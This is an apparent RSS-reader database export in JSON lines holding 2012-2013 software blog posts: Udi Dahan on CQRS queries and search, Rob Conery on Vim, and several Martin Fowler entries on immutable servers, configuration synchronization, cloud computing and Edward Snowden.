{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/Sd_udILOF9Y/","title":"Queries, Patterns, and Search – food for thought","published":{"$wrap":"$date","v":1367145896000,"h":"2013-04-28T10:44:56.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/fish.png\" alt=\"fish\" title=\"fish\" width=\"250\" height=\"250\" style=\"float:right; margin-left:10px; margin-bottom:10px;\" />With all the talk of CQRS, the area that doesn’t get enough treatment (in my opinion) is that of queries. Many are already beginning to understand the importance of task-based UIs and how that aligns to the underlying commands being sent, validated, and processed in the system as well as the benefits of messaging-centric infrastructure (like <a href=\"http://www.NServiceBus.com\">NServiceBus</a>) for handling those commands reliably. When it comes to queries, though, it isn’t nearly as well understood what it means for a query to be “task based”.</p><h3>Starting with CRUD</h3><p>Let’s start with a traditional CRUD application and work our way out from there.</p><p>In these environments, we often see users asking us to build “excel-like” screens that allow them to view a set of data as well as sort, filter, and group that data along various axes. While we might not get this requirement right away, after some time users begin to ask us to allow them to “save” a certain “query” that they have set up, providing it some kind of name.</p><p>That, right there, is a task-based query and it is the beginning of deeper domain insight.</p><h3>Pattern matching</h3><p>Any time a user is repeatedly running the same query (this can be once a day or some other unit of time) there is some scenario that the business is trying to identify and is using that user as a pattern-matching engine to see if the data indicates that that scenario has occurred.</p><p>It’s quite common for us to get a requirement to add some field (often a boolean or enum) to an entity which defaults to some value and then see that same field used in filtering other queries. These measures are sometimes instituted as a temporary stop-gap while a larger feature is being implemented, though (as the saying goes) there is nothing more permanent than a temporary solution.</p><h3>Where we developers go wrong</h3><p>The thing is, many developers don’t notice these sorts of things happening because we don’t actually look at the kinds of queries users are running.</p><p>One excellent technique to better understand a domain is to sit down with your users while they’re working and ask them, “what made you run that query just now?”, “why that specific set of filters?”. </p><p>What I’ve noticed over the years is that our users find very creative ways to achieve their business objectives <b><i>despite</i></b> the limitations of the system that they’re working with. We developers ultimately see these as requirements, but they are better interpreted as <b>workarounds</b>.</p><p>I’ll talk some more about how a software development organization should deal with these workarounds in a future post, but I want to focus back in on the queries for now.</p><p>Oh, and don’t get me started on caching or NoSQL, not that I think that those tools don’t provide value – they do, but they’re only relevant once you know which business problem you’re solving and why.</p><h3>Not all queries are created equal</h3><p>Even before bringing up the questions I described in the previous section, any time you get query-centric requirements the first question to ask is “how often will the user be running this specific query?”.</p><p>If the answer is that the <b>specific</b> query will be run periodically (every day, week, etc), then drill deeper to see what pattern the user will be looking for in the data. If the person you’re talking to doesn’t know to answer that question, then go find someone who does. Every periodic query I’ve seen has some pattern behind it – and in my conversations with thousands of other developers over the years, I’ve seen that this is not just my personal experience.</p><p>But there is a case where a query does get run repeatedly without there being a pattern behind it.</p><p>I know this sounds like I’m contradicting myself, but the distinction is the word “specific” that I emphasized above.</p><p>There are certain users who behave very differently from other users – these users are often doing what I call <b>research</b>, i.e. the “I don’t know what I’m looking for but I’ll know it when I see it” people.</p><p>These researchers tend to repeatedly query the data in the system however they tend to run different queries all the time. This is the reason why traditional data warehouse type solutions don’t tend to work well for them. Data warehouses are optimized for running specific queries repeatedly.</p><p>Keeping the Single-Responsibility Principle in mind – we should not try to create a single query mechanism that will address these two very different and independently evolving needs.</p><h3>And now on to Search</h3><p>Search is a feature that is needed in many systems and whose complexity is greatly underestimated.</p><p>While the developer community has taken some decent strides in understanding that search needs to be treated differently from other queries, the common Lucene/Solr solutions that are applied are often overwhelmed by the size of the data set on which the business operates.</p><p>The problem is compounded by our user population being spoiled by Google – that simple little text box and voila, exactly what you’re looking for magically appears instantaneously. They don’t understand (or care) how much engineering effort went into making that “just work”.</p><p>Lucene and Solr work well when your data set isn’t too large, and then they become pretty useless as the quality of their results degrades. The thing is that many of us in IT tend to work on projects where we have an unrealistically small data set that we use to test the system and, at these volumes, it looks like our solutions work great. But if you have 20 million customers, do you think a full text search on “Smith” is going to find just the right one?</p><p>Larger data sets require a <b>relevance engine</b> – something that feeds off of what users do <b>AFTER</b> the query to influence the results of future queries. Did the user page to the next screen? That needs to be fed back in. Did they click on one of the results? That needs to be fed back in too. Did they go back to the search and do another similar search right after looking at a result – that should possibly undo the previous feedback.</p><p>And that’s just relevance for beginners.</p><p>You know what makes Google, you know, Google? It’s that they have this absolutely massive data set of what users do after the query that informs which results they return when. You probably don’t have that. That and search is/was their main business for many years – I’m betting that it’s not your main business.</p><p>You should discuss this with your stakeholders the next time they ask for search functionality in your system.</p><h3>In closing</h3><p>I know that the common CQRS talking points tell you to keep your queries simple, but that doesn’t mean that simple is easy.</p><p>It takes a fair bit of domain understanding to figure out what the queries in the system are supposed to be – what tasks users are trying to achieve through these queries. And even when you do reach this understanding, convincing various business stakeholders to change the design of the UI to reflect these insights is far from easy.</p><p>It often seems like the reasonable solution to give our users everything, to not limit them in any way, and then they’ll be able to do anything. What ends up happening is that our users end up drowning in a sea of data, unable to see the forest for the trees, ultimately resulting in the company not noticing important trends quickly enough (or at all) and therefore making poor business decisions.</p><p>Even if your company doesn’t believe itself to be in “Big Data” territory, I’d suggest talking with the people on the “front lines” just in case. Many of them will report feeling overwhelmed by the quantity of stuff (to use the correct scientific term) they need to deal with.</p><p>It’s not about Lucene, Solr, OData, SSRS, or any other technology.</p><p>It’s on you. Go get ‘em.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=Sd_udILOF9Y:-POQArstVLM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=Sd_udILOF9Y:-POQArstVLM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=Sd_udILOF9Y:-POQArstVLM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=Sd_udILOF9Y:-POQArstVLM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=Sd_udILOF9Y:-POQArstVLM:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/Sd_udILOF9Y\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1180}}
{"k":"0000000084","o":"0000001714","v":"001"}
{"_id":1181,"_uid":1181,"_dt":1373742620955,"_s":"598a20238317aa69949ef816868c4f5e"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/c7aSqNlGVho/","title":"NServiceBus Events in Sweden","published":{"$wrap":"$date","v":1346412795000,"h":"2012-08-31T11:33:15.000Z"},"starred":false,"read":false,"content":"<p>The one and only Andreas Ohlund will be touring through Sweden as a part of the .NET Best Practices Community Days organized by Edument and Informator. He’ll be hitting Göteborg on Sep 12, Stockholm on Sep 13, and Malmö on Sep 14.</p><p>These full-day events will include topics like CQRS, REST, as well as async and functional programming.</p><p>Full information and registration is available <a href=\"http://www.edument.se/events/2012/dot-Net-Best-Practices-Community-Day-2012-Overview.html\">here</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=c7aSqNlGVho:nqNZW1tH0ts:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=c7aSqNlGVho:nqNZW1tH0ts:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=c7aSqNlGVho:nqNZW1tH0ts:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=c7aSqNlGVho:nqNZW1tH0ts:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=c7aSqNlGVho:nqNZW1tH0ts:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/c7aSqNlGVho\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1181}}
{"k":"0000000084","o":"0000009781","v":"001"}
{"_id":1182,"_uid":1182,"_dt":1373742620955,"_s":"570dd62a88aef838c61a7b29d8c305f5"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/S7Y_jH8HtTE/vim-the-alpha-and-omega","title":"Vim: The Alpha and Omega","published":{"$wrap":"$date","v":1367161200000,"h":"2013-04-28T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I love experimenting with text editors and occasionally IDEs. In the last 6 months I've used no less than 5 different ones... each time I learn just how valuable Vim is to me.</p><p><img src='http://wekeroad.com/images/vim-commands.jpg'/></p><p><p><i>image from<a href=\"http://jonathanpberger.wordpress.com/2011/02/06/vi-tutorial-for-dvorak-typists/\">http://jonathanpberger.wordpress.com/2011/02/06/vi-tutorial-for-dvorak-typists/</a></i></p><h2>Skillz</h2><p>Consider:<strong>if you're a coder you type for a living</strong>. Code, email, docs - whatever. One of the biggestefficiency gains you can achieve is to<strong>become a faster editor</strong>. This is what Vim does best: help you edit Faster, Better, Stronger - and you can carry these skills with you to almost any editor available today.</p><p>Notice I didn't say that Vim makes you a\"faster typer\" - no a faster Editor. Modern IDEs have focused on that of late - and no one is better at it than JetBrains.</p><p>For the last 4 months I've been using<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>and<a href=\"http://www.jetbrains.com/webstorm\">WebStorm</a>and have fallen in love with them. WebStorm especially - if you're a Javascript person (Node or whatever) - it's a great deal at $49.</p><p><img src=\"http://www.jetbrains.com/webstorm/whatsnew/screenshots/60/html5outline.png\" alt=\"WebStorm\"></p><p>I'm not an intellisense person (since moving my focus away from .NET) but I do find it extremely helpful when working with new libraries. For instance: the Angular plugin for WebStorm helped me explore many of the\"ng-\" tags that I would not have seen otherwise.</p><p><img src=\"/images/angular-plugin.png\" alt=\"Angular Plugin\"></p><p>In the<a href=\"http://tekpub.com/productions/angular\">Tekpub Angular Series</a>I've been using WebStorm exlclusively and I've really enjoyed it.</p><p>Both RubyMine and WebStorms have interesting navigation schemes (I think this extends to Resharper for VS too):</p><ul><li>Cmd-O allows you to search by a class name</li><li>Cmd-Shift-O allows you to search by file name</li><li>Cmd-Option-O allows you to search by symbol (a method name, for instance)</li><li>Cmd-B takes you to a class or method declaration directly</li><li>In the gutter of a Rails project are\"go to view\" (when you're in a Controller) and\"go to Controller\" when you're in a view</li><li>Cmd-E opens a popup of recently edited files</li></ul><p>Really helpful stuff. In addition there are some great inspection features that offer\"squigglies\" (as Hanselman calls them) when methods aren't found, script files don't exist, etc. If you trust it - the editor will also give you refactoring options for your code...</p><p>These are helpful features - but are they helping me edit code faster? In some ways yes... in other ways...</p><h2>Enter Vim</h2><p><a href=\"http://codeofrob.com\">Rob Ashton</a>was out here in Hawaii visiting recently and he is a devoted Vim user. I was showing him WebStorm and all the neat things that go with it - but both of us agreed that we could code faster in Vim.</p><p><i><strong>Note</strong>: I know there are Vim plugins for JetBrains bits (and most other IDEs) - I'll get there.</i></p><p>While recording a video<a href=\"http://us2.campaign-archive1.com/?u=5e6e923ae72e1d1815a5df825&id=40b9d577bd&e=\">for our upcoming\"Career Reboot\" production at Tekpub</a>, I asked Rob\"what tools do you take with you while you hop the globe, journeyman coding\"?</p><p><img src=\"/images/reboot.jpg\" alt=\"Tekpub's Career Reboot\"></p><p>For the last year or so<strong>Rob has been travelling the planet</strong>, working on various projects for a few weeks at a time. His experiment was a simple one:</p><blockquote><p>Pay for my travel, lodging and food and I'll do the work for free</p></blockquote><p>With him was<strong>a single bag for his clothes and a backpack with 2 computers</strong>. He gave up his house and all of his furniture and put a few small things in storage and then set out - ending his journey here in Hawaii.</p><p>His work was varied and he wasn't sure for than a month at a time where he'd be next. Aside from the practical aspect - how do you prepare your machine for working in projects ranging from .NET to C++, Ruby to JavaScript. Rob hate's VMs as well - preferring to work on the native OS.</p><p><strong>He has one Windows Machine and one Mac</strong>. He wiped OSX off his Mac, however, and installed Ubuntu...</p><p>So what does Rob rely on for writing code?</p><blockquote><p>Vim</p></blockquote><p>For much of the code he writes, Vim will suffice, everytime. He can load up any set of plugins he needs to write effectively in Ruby, Javascript or Python. He knows the commands well and to watch him use the editor is a fascinating treat.</p><p>When working in Visual Studio, he uses<a href=\"http://visualstudiogallery.msdn.microsoft.com/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329\">the VsVim plugin</a>and, according to him:</p><blockquote><p>If I didn't have these Vim plugins for VisualStudio I'd be screwed</p></blockquote><p>Most IDEs have a Vim\"overlay\". All of the JetBrains IDEs do, and so does SublimeText and ... well just about any editor you can think of.</p><h2>Vim, Everywhere</h2><p><strong>In terms of editing code, Vim won.</strong>The eternal Vim/Emacs war will rage on forever - but I don't think anyone can argue that,<strong>in terms of pure editing power: Vim does what it does, extremely well</strong>.</p><p>From your new shiny Mac Air to the Linux box in the cloud somewhere: open the terminal and hit\"vim\" and it's likely there, ready to edit config files or code.<strong>Vim is the Alpha and Omega editor</strong>- the beginning and the end.<strong>Vim is everywhere</strong>.</p><p><em>So it's back to Vim for me</em>. I like the JetBrains tools and I enjoy SublimeText 2 a lot... but I can move and edit in Vim at twice the speed.</p><p>You might be wondering:<strong>\"why not just use a Vim plugin dude?\"</strong></p><p>The inspections, plugins and\"helper\" functions in the JetBrains tools are interesting and helpful,<strong>but they come at a price</strong>(to me). It slows down the IDE, slows down typing, and many times it offers things I just don't want (like spelling corrections in my HTML files).</p><p>Often-times I feel like I spent an increasing amount of time diddling with the IDE more than the code. Looking up shortcuts, setting up configurations for testing, running and debugging... when I know how to do this already<strong>without the slick interface</strong>.</p><p>I like a pretty coding surface. I appreciate clean font rendering and seeing a project tree with all my code files and a fast, fuzzy file-finding feature.<em>And I can get all of that with Vim</em>.</p><p>I proved that to myself yesterday when editing a Rails project. Leader-P brought up<a href=\"https://peepcode.com/products/peepopen\">PeepOpen</a>,<code>\"/mailto\"</code>took me to a broken mail link.<code>\"c4w mailto:support\"</code>and the broken email was fixed.<code>RController pro[tab]</code>and I'm editing the ProductsController...</p><p>My Vim-glee was broken, however, when I realized I had forgotten the syntax for ActiveRecords eager-loading feature (include, include?, includes). Uh oh.</p><p>Rob put it very well when discussing IDEs:</p><blockquote><p>If a tool starts thinking for me, starts remembering the syntax that I need to write... I'll forget the code and start becoming reliant on that tool to do my work for me.</p></blockquote><p>This has happened to me ... quite often. When I was working in .NET it was nearly impossible for me to free-hand (without intellisense) simple structures like lambdas or a generic class definition using an interface. It's a syntax-heavy language and I can see how intellisense helps you with it.</p><p>The thing you lose, however, is<em>thinking in that language</em>. When the syntax is ready in your brain, you can<strong>think in code</strong>and sidestep the translation through the editor.</p><p>This is where Vim shines most and languages like Ruby flex their expressive muscle.<strong>You think the code, Vim expresses it directly</strong>.</p><p>The best part? You don't need to be using Vim to use Vim. Drop a plugin in a JetBrains IDE or Visual Studio and you're off (if you need to use those tools for whatever reason).</p><p>You never know, one day you might need to work in Clojure in Vilnius...</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/S7Y_jH8HtTE\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1182}}
{"k":"0000000084","o":"0000007022","v":"001"}
{"_id":1183,"_uid":1183,"_dt":1373742620955,"_s":"d563dedee8b6b4cbc7985f2009868dac"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/ImmutableServer.html","title":"Bliki: ImmutableServer","published":{"$wrap":"$date","v":1371134100000,"h":"2013-06-13T14:35:00.000Z"},"starred":false,"read":false,"content":"<p>Automated configuration tools (such as<a href=\"http://cfengine.com/\">CFEngine</a>,<a href=\"https://puppetlabs.com/puppet/what-is-puppet/\">Puppet</a>, or<a href=\"http://www.opscode.com/chef/\">Chef</a>) allow you to specifyhow servers should be configured, and bring new and existing machinesinto compliance. This helps to avoid the problem of fragile<a href=\"http://martinfowler.com/bliki/SnowflakeServer.html\">SnowflakeServers</a>. Such tools can create<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServers</a>that can be torn down and rebuilt at will. An Immutable Server is thelogical conclusion of this approach, a server that once deployed, isnever modified, merely replaced with a new updated instance.</p><p>Automated configuration tools are usually used with<a href=\"http://martinfowler.com/bliki/ConfigurationSynchronization.html\">ConfigurationSynchronization</a>where you leave a serverrunning for a potentially long period of time, repeatedly applyingconfiguration to bring it into line with the latest specification.In theory servers can be allowed to run indefinitely, and they'll bekept completely consistent and up to date. In practice it's notpossible to manage a server's configuration completely, so there isconsiderable scope for configuration drift, and unexpected changesto running servers.</p><p>This is where a<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServer</a>is helpful.</p><img src=\"http://martinfowler.com/bliki/images/immutableServer/PhoenixServerLifecycle.png\" title=\"Lifecycle of a Phoenix Server\"/><p>By frequently destroying and rebuilding servers from the baseimage, 100% of the server's elements are reset to a known state,without spending a ridiculous amount of time specifying andmaintaining detailed configuration specifications.</p><p>Once you're using phoenixes, the focus ofconfiguration management shifts to the management of base images.Fixes, changes, and updates are applied to the base image ratherthan to running systems. Each time you want a new update you modifythe base instance and run it through an automated test harness. You onlycreate new servers when they pass these steps.</p><p>So a phoenix server's complete state is built from a combinationof base image + automated configuration management + data<a href=\"#footnote-data\">[1]</a>, which reduces the pressure to have automatedconfiguration manage 100% of the server.</p><p>But while we can continue to run configuration management updateson a server during its brief lifetime, there's less value in doingso. In fact, there is considerable value in<i>not</i>doing so, sinceany change to a running system introduces risk.</p><p>This leads naturally to immutable servers<a href=\"#footnote-coin\">[2]</a>.</p><img src=\"http://martinfowler.com/bliki/images/immutableServer/ImmutableServerLifecycle.png\" title=\"Lifecycle of an Immutable Server\"/><p>Once you've spun up a server instance from a well-tested base image, youshouldn't run configuration management tools, since they createopportunities for untested changes to the instance. Any changes thatare needed can be made to the base image, tested, and then rolledout. Servers without the change are torn down and replaced.</p><p>If this sounds familiar, it's because it follows the practices of<a href=\"/articles/continuousIntegration.html\">ContinuousIntegration</a>and<a href=\"http://martinfowler.com/bliki/ContinuousDelivery.html\">ContinuousDelivery</a>. WithContinuous Delivery of software, it's safer to compile a given version ofan application into a deployable artifact only once, and know that you aredeploying and running a consistently built application in all environments.With an immutable server, you make each change to a base image, and thenyou know that all instances created from that image are consistent.</p><p>The main differences between instances of a server role come fromconfiguration settings, which should come from outside the server.For example, most virtualization and cloud platforms offer a way toset metadata values when provisioning a new instance, which can thenbe read by the running server. New servers may also pullconfiguration values from a central registry like<a href=\"http://zookeeper.apache.org/\">Zookeeper</a>.</p><p>It's advisable to minimize the number and scope of per-instanceconfiguration items for immutable servers, and to run changes tothese through automated testing where feasible.</p><hr class=\"topSection\"/><h2 id=\"HandlingData\">Handling data</h2><p>If servers are disposable, the data that lives on them often is not.When implementing phoenix or immutable servers you should consider whatdata needs to be persisted as servers are destroyed and created, and whatdata must be replicated in order to scale by adding additional servers.</p><p>You can ship data off of the instance when it has value but isn't neededat runtime, for example sending logfiles to a central syslog server. A sharedfile system like NFS can make files available to servers, perhaps living ona SAN. Cloud platforms generally offer mountable storage devices like AWSEBS volumes which can be attached to new servers instances when the old onesare destroyed, or quickly duplicated and attached to replicas when scaling acluster. Often you can pass the buck to a service which someone else maintains,like Amazon's RDS database service.</p><div class=\"furtherReading\"><h2>Further Reading</h2><p>Netflix has been at the forefront in using the ImmutableServerpattern, although I'm not aware that they've used the term. Theyhave open-sourced the Aminator tool they developed to manage AMIinstances for use on Amazon's AWS cloud and<a href=\"http://techblog.netflix.com/2013/03/ami-creation-with-aminator.html\">bloggedabout how their use of this pattern has evolved</a>withexperience. Interestingly, the speed of instantiating newinstances has been a key driver for them, since this helps them toautomatically scale and recover.</p></div><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-data\"><p><span class=\"num\">1:</span>Data covers a variety of things, including database files and other application-managed data, runtime state, other runtime-generated data such as log files, and externally supplied configuration.</p></div><div class=\"footnote-list-item\" id=\"footnote-coin\"><p><span class=\"num\">2:</span>My colleague Ben Butler-Cole coined the term \"Immutable Server\" for this pattern on an internal ThoughtWorks mailing list,and<a href=\"http://www.thoughtworks-studios.com/blog/rethinking-building-cloud-part-4-immutable-servers\">has provided insights from his experiences with it</a>.</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1183}}
{"k":"0000000084","o":"0000002254","v":"001"}
{"_id":1184,"_uid":1184,"_dt":1373742620955,"_s":"49809d901fd0c66aa7bf05d53dea7d94"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/snips/201306100949.html","title":"Thoughts on Edward Snowden","published":{"$wrap":"$date","v":1370872140000,"h":"2013-06-10T13:49:00.000Z"},"starred":false,"read":false,"content":"<p>This last weekend was the ThoughtWorks North American awayday. Following the suicide earlier this year of Aaron Swartz, we had a theme around the role of the internet and the software profession to combat overreaching government and corporate power; featuring speeches by<a href='http://joyb.blogspot.com'>Birgitta Jonsdottir</a>,<a href='https://twitter.com/justleft'>Michael Ratner</a>, and (by video link) Julian Assange. It was merely a happy coincidence that this weekend corresponded with successive leaks of troubling activities by government agencies under the Obama administration.</p><p>As I boarded the flight home, I read the news of Edward Snowden’s<a href='http://www.guardian.co.uk/world/2013/jun/09/edward-snowden-nsa-whistleblower-surveillance'>account of why he made these leaks</a>, and furthermore, why he chose to publicly take responsibility for them. Based on the information I currently have, I am struck with admiration for the courage and thoughtfulness of Edward Snowden’s actions. The path of a whistleblower is not an easy route, because it rests on the difficult dilemma between breaking the trust of the community we work with and our responsibility to our wider community: our country and humanity as a whole. I have had mixed feelings about some of the whistleblowing against the US government in recent years, some cases I’ve admired, but in other cases I’ve felt that the secrets revealed have not measured up to the high standards required by breaking that smaller trust.</p><p>In Edward Snowden’s case, these secrets so far have met that high standard. I am concerned both by these actions of the US government and by the secrecy that’s obscured these actions - a secrecy that makes it impossible for we the people to debate the correctness of our representatives’ policies. I hope we the people will support a public servant who put his responsibility to us over the government that serves us.</p>","author":false,"_id":{"$wrap":"$oid","v":1184}}
{"k":"0000000084","o":"0000001420","v":"001"}
{"_id":1185,"_uid":1185,"_dt":1373742620956,"_s":"20a40e7a3bb6ec9973bb22dc093f0326"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/CloudComputing.html","title":"Bliki: CloudComputing","published":{"$wrap":"$date","v":1373551680000,"h":"2013-07-11T14:08:00.000Z"},"starred":false,"read":false,"content":"<p>\"Cloud\" has become a very over-hyped term over the last few years.One of the characteristics of over-hyped words is that they havelittle or no definition to them (yes<a href=\"http://martinfowler.com/bliki/NosqlDefinition.html\">NosqlDefinition</a>I'mlooking at you).</p><p>As it turns out there is an excellent definition of cloudcomputing available, from none other that<a href=\"http://www.nist.gov\">NIST</a>. It's available by awonderfully short and easy to understand<a href=\"http://csrc.nist.gov/publications/nistpubs/800-145/SP800-145.pdf\">standards document</a>(no, I'mnot kidding).</p><p>NIST defines cloud as access to a pool of computing resources(servers, storage, networks, services etc) that can be rapidlyprovisioned and made available with minimal overhead.</p><p>It briefly defines</p><ul><li>fiveessential characteristics: on demand self-service, broad networkaccess, resource pooling, rapid elasticity, and measuredservice.</li><li>three service models: software,  platform, and infrastructure(all as a service).</li><li>four deployment models: private, community, public, and hybrid.</li></ul>","author":false,"_id":{"$wrap":"$oid","v":1185}}
{"k":"0000000084","o":"0000005800","v":"001"}
{"_id":1186,"_uid":1186,"_dt":1373742620956,"_s":"908f8027c365eae7107d2a5f0c3034d8"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/ConfigurationSynchronization.html","title":"Bliki: ConfigurationSynchronization","published":{"$wrap":"$date","v":1371134040000,"h":"2013-06-13T14:34:00.000Z"},"starred":false,"read":false,"content":"<p>Automated configuration tools (such as<a href=\"http://cfengine.com/\">CFEngine</a>,<a href=\"https://puppetlabs.com/puppet/what-is-puppet/\">Puppet</a>, or<a href=\"http://www.opscode.com/chef/\">Chef</a>) allow you to avoid<a href=\"http://martinfowler.com/bliki/SnowflakeServer.html\">SnowflakeServers</a>by providing recipes to describe theconfiguration of elements of a server. Configuration synchronizationcontinually applies these specifications, either on a regular scheduleor when it changes, to server instances throughout their lifetime. Ifsomeone makes a change to a server outside the tool, it will be revertedto the centrally specified configuration the next time the server issynchronized. If some configuration change is needed, it's made in theconfiguration specification (recipes, manifests, or whatever the particularconfiguration tool calls it), and is then applied to all relevantservers across the infrastructure.</p><img src=\"http://martinfowler.com/bliki/images/configurationSync/ConfigurationSynchronizationPattern.png\" title=\"Configuration is synchronized to the server repeatedly during its lifetime\"/><p>In theory, once a server has been created, configurationsynchronization will keep it up to date, applying upgrades andpatches and preventing<a href=\"http://kief.com/configuration-drift.html\">configuration drift</a>for a potentially longlifetime.</p><p>In practice, however, it isn't feasible to keep serverscompletely consistent using current automated configurationmanagement tools, so over time configuration synchronizationleads to inconsistency.<a href=\"#footnote-vendor\">[1]</a></p><p>Each element of server configuration managed by an automated toolrequires work to write, test, and maintain the recipe or manifest.It simply isn't reasonable to attempt to manage every single elementof a typical server using these tools. There are far too many ofthem. And for each additional element you do specify, thework involved grows non-linearly thanks to the potentialinteractions, integrations, and dependencies between them.</p><p>Software packages are a particular challenge, given thedependencies they may have on yet more packages. Tools such asyum, apt-get, gems, etc. automatically work out dependencies andinstall them from repositories. So a large number of the packageson a system are only implicitly managed, and may change withoutnotice. Although you can micro-manage the versions and dependenciesof software packages installed, it's an intractable job consideringthe number of packages involved.</p><p>If managing the stuff you want to have on your server isdifficult, managing the things you don't want is worse, given thereare an effectively inifinite number of them. Current configurationmanagement tools require you to explicitly list each file, package,or other element you want removed if found. This means additionalthings can be manually added onto some servers, creating inconsistentand unexpected behaviour.</p><img src=\"http://martinfowler.com/bliki/images/configurationSync/ConfigurationSynchronization_UnmanagedChanges.png\" title=\"Changes left unmanaged by ConfigurationSynchronization\"/><p>In reality, people using automated configuration tools get bywell enough without specifying 100% of the configurable surface areaof their servers. Teams apply the 80/20 rule to automated configuration,focusing 80% (or more like 95%) of their attention on defining that20% (or 5%) of the system which is most relevant to their particularneeds, leaving the rest to the defaults installed by the base OS. Sothe majority of the system is not under automated configuration, andgenerally, this works. Unfortuantely, when it doesn't - when somepart of the system not managed by automation tools does cause an issue,the effects are unexpected and can be difficult to track down.</p><p>This problem grows worse over the lifespan of a server,and with the frequency of change. The longer a server stays up, themore it may deviate from other servers, especially newer ones.</p><p>This issue leads some people to use<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServers</a>. Byensuring that a server's lifespan is kept short, frequentlyrebuilding fresh ones from a base image, the potential forconfiguration drift is kept small, without the overhead ofspecifying more of the server's configuration in a management toolthan is really necessary. Taking the phoenix server to its logicalconclusion leads to<a href=\"http://martinfowler.com/bliki/ImmutableServer.html\">ImmutableServers</a>, whichavoid any changes made to a server during it's lifespan.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-vendor\"><h3 class=\"head-text\">1: Vendor Aspirations</h3><p>My colleague Max Lincoln provided these references toconfiguration tool vendors' aspirations around total systemconfiguration:</p><ul><li>\"Create a blueprint of your infrastructure - so it can be builtor rebuilt consistently from scratch in minutes\" -<a href=\"http://www.opscode.com/solutions/configuration-management/\">OpscodeChef</a></li><li>\"Eliminate configuration drift and reduce outages\" -<a href=\"https://puppetlabs.com/solutions/configuration-management/\">Puppetlabs</a></li><li>\"CFEngine then continuously corrects configuration drift,keeping systems in compliance with their Desired State.\" -<a href=\"http://cfengine.com/what-is-cfengine\">CFEngine</a></li></ul></div></div>","author":false,"_id":{"$wrap":"$oid","v":1186}}
{"k":"0000000084","o":"0000003617","v":"001"}
{"_id":1187,"_uid":1187,"_dt":1373742620956,"_s":"e2c4acebd934f40d015dcf950e1b941f"}
